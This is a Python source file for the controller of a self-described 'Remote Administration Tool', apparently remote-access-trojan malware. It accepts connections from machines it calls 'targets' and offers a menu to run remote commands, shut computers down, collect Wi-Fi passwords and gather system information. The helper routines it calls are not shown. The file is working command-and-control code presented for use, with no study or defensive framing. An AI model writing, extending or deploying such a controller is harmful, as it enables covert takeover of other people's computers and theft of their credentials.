import constants
import HelperMethods
import threading
from socket import *


class Server(object):
    # Variables
    sock = socket(AF_INET, SOCK_STREAM)
    targets = []

    # Start listening for incoming connections
    def run(self):
        self.sock.bind((constants.IP, constants.PORT))
        self.sock.listen(constants.NUMBER_OF_CONNECTIONS)
        print(f"[*] Listening on {constants.IP}:{constants.PORT}")

        # Handle incoming connections on a new thread
        target_thread = threading.Thread(target=self.handle_target, args=(self.sock,))
        target_thread.start()

        # Show main menu
        while True:
            if len(self.targets) > 0:
                HelperMethods.show_menu()
                selection = int(input("Enter selection: "))

                if selection == 1:
                    HelperMethods.show_all_targets(self.targets)
                elif selection == 2:
                    HelperMethods.execute_command(self.targets)
                elif selection == 3:
                    HelperMethods.shutdown_computer()
                elif selection == 4:
                    HelperMethods.get_wifi_passwords(self.targets)
                    pass
                elif selection == 5:
                    HelperMethods.get_system_info(self.targets)
                else:
                    continue

    # Handle incoming connection
    def handle_target(self, sock):
        while True:
            connection = None
            try:
                connection, address = sock.accept()  # Get socket & ip
                self.targets.append([connection, address])  # Save to list
                print(f"\n[+] Accepted connection from {address[0]}:{address[1]}")
            except KeyboardInterrupt:
                print("\n[-] Keyboard Interrupt...")
                if connection:
                    connection.close()
                break


if __name__ == "__main__":
    banner = """
        ******************************
        * Remote Administration Tool *
        *      by: Idan Moshe        *
        ******************************
        """

    HelperMethods.clear_screen()
    print(banner)
    server = Server()
    server.run()
